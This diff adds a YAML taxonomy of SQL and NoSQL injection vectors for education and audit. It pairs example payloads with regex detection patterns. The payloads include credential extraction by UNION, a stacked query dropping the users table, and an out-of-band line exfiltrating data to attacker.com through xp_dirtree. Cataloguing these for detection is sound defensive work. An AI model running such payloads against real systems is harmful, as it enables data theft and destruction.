@@ -1,0 +1,111 @@
+---
+# SQL Injection Attack Vectors — taxonomy for education and audit
+
+attack_vectors:
+  classic:
+    - id: "UNION_SELECT"
+      name: "UNION-based injection"
+      description: "Uses UNION SELECT to retrieve data from other tables"
+      example: "' UNION SELECT username, password FROM users--"
+      severity: "critical"
+      detection:
+        code: "UNION\s+(ALL\s+)?SELECT"
+        log: "(?i)union\s+(all\s+)?select"
+
+    - id: "ERROR_BASED"
+      name: "Error-based injection"
+      description: "Extracts data through database error messages"
+      example: "' AND extractvalue(1,concat(0x7e,(SELECT database())))--"
+      severity: "critical"
+      dbms_specific:
+        mysql: "extractvalue(), updatexml(), floor()/rand()/group by"
+        mssql: "convert() casting errors, group by having"
+        postgresql: "cast() errors, division by zero"
+        oracle: "utl_inaddr.get_host_name(), ctxsys.drithsx.sn()"
+      detection:
+        code: "extractvalue|updatexml"
+        log: "(?i)(extractvalue|updatexml|convert.*error|division by zero)"
+
+    - id: "BLIND_BOOLEAN"
+      name: "Boolean-based blind injection"
+      description: "Infer data through boolean condition response differences"
+      example: "' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a"
+      severity: "critical"
+      detection:
+        code: "SUBSTRING|MID\(|ascii\("
+        log: "(?i)(and\s+\d+=\d+|or\s+\d+=\d+|1=1|SUBSTRING|MID\(|ASCII\()"
+
+    - id: "BLIND_TIME"
+      name: "Time-based blind injection"
+      description: "Infer data through time delay response differences"
+      example: "'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--"
+      severity: "critical"
+      dbms_specific:
+        mysql: "SLEEP(), BENCHMARK()"
+        postgresql: "pg_sleep(), generate_series()"
+        mssql: "WAITFOR DELAY, WAITFOR TIME"
+        oracle: "DBMS_LOCK.SLEEP()"
+      detection:
+        code: "sleep\(|benchmark\(|pg_sleep|WAITFOR DELAY|DBMS_LOCK"
+        log: "(?i)(sleep\(\d+\)|benchmark\(\d+|WAITFOR DELAY|pg_sleep|DBMS_LOCK)"
+
+    - id: "STACKED_QUERIES"
+      name: "Stacked queries"
+      description: "Multiple SQL statements executed in a single request"
+      example: "'; DROP TABLE users; SELECT * FROM data WHERE '1'='1"
+      severity: "critical"
+      detection:
+        code: ";\s*(DROP|INSERT|UPDATE|DELETE|ALTER|CREATE|EXEC)"
+        log: "(?i);\s*(drop|insert|update|delete|alter|create|exec|truncate|grant)"
+
+    - id: "OUT_OF_BAND"
+      name: "Out-of-band injection"
+      description: "Data exfiltration via DNS/HTTP when direct channel unavailable"
+      example: "'; DECLARE @q varchar(99); SET @q='\\\\attacker.com\\'+SELECT @@version; EXEC master..xp_dirtree @q"
+      severity: "critical"
+      dbms_specific:
+        mssql: "xp_dirtree, xp_fileexist, sp_send_dbmail"
+        mysql: "LOAD_FILE(), SELECT ... INTO OUTFILE"
+        oracle: "UTL_HTTP, UTL_FILE, UTL_TCP"
+        postgresql: "COPY ... TO PROGRAM"
+      detection:
+        code: "xp_dirtree|xp_fileexist|LOAD_FILE|OUTFILE|UTL_HTTP|COPY.*PROGRAM"
+        log: "(?i)(xp_dirtree|LOAD_FILE|INTO OUTFILE|UTL_HTTP\.REQUEST|COPY.*PROGRAM)"
+
+  advanced:
+    - id: "SECOND_ORDER"
+      name: "Second-order injection"
+      description: "Payload stored, executed on later retrieval (e.g. username→admin query)"
+      example: "Username: admin'-- — injected at registration, executed at profile view"
+      severity: "high"
+      detection:
+        code: "No direct pattern — requires data-flow analysis"
+        log: "No direct pattern — appears as legitimate query"
+
+    - id: "STORED_XSS_TO_SQLI"
+      name: "Stored XSS → SQLi chain"
+      description: "XSS payload stored in DB field, retrieved and used in SQL without sanitization"
+      example: "<script>/* SQLi payload in stored XSS vector */</script>"
+      severity: "high"
+      detection:
+        code: "No direct pattern — requires taint analysis"
+        log: "(?i)(<script.*select|javascript:.*select)"
+
+    - id: "ENCODED_PAYLOADS"
+      name: "Encoded/obfuscated payloads"
+      description: "URL-encoded, hex-encoded, double-encoded, Unicode-escaped SQLi"
+      example: "%27%20UNION%20SELECT, 0x554e494f4e, \u0027 UNION SELECT"
+      severity: "high"
+      detection:
+        code: "No direct code pattern — log-level detection"
+        log: "(?i)(0x[0-9a-f]{6,}|%27|%22|CHAR\(\d|CONCAT\(0x|\\\u0027|/*!|UNHEX\()"
+
+  nosql:
+    - id: "NOSQL_INJECTION"
+      name: "NoSQL injection"
+      description: "Injection in MongoDB, Redis, CouchDB queries"
+      example: '{"$gt": ""}, {"$ne": null}, {"$where": "this.password == '\''admin'\''"}'
+      severity: "critical"
+      detection:
+        code: '\$gt"|\$ne"|\$where"|\$regex"|\$exists"'
+        log: "No direct log pattern — application-layer detection"
